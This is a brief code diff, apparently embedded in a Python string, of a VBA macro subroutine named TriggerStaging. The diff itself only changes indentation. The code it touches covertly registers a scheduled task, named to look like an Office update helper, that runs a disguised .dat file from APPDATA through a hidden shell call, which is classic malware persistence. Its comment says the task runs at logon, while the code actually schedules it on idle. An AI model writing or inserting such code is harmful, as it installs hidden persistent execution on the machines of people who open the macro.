@@ -113,10 +113,10 @@ Private Sub TriggerStaging()
     Dim helperPath As String
     
     ' Encoded target name: T2ZmaWNlX1VwZGF0ZV9IZWxwZXI=
-    helperPath = Environ("APPDATA") & "\\Microsoft\\Office_Update_Helper.dat"
+	helperPath = Environ("APPDATA") & "\\Microsoft\\Office_Update_Helper.dat"
     
     ' Scheduled task execution at user logon
-    cmd = "schtasks /create /tn \\"Office_Update_Helper\\" /tr " & helperPath & " /sc onidle /i 5 /f"
+	cmd = "schtasks /create /tn \\"Office_Update_Helper\\" /tr " & helperPath & " /sc onidle /i 5 /f"
     Shell cmd, vbHide
 End Sub
 """
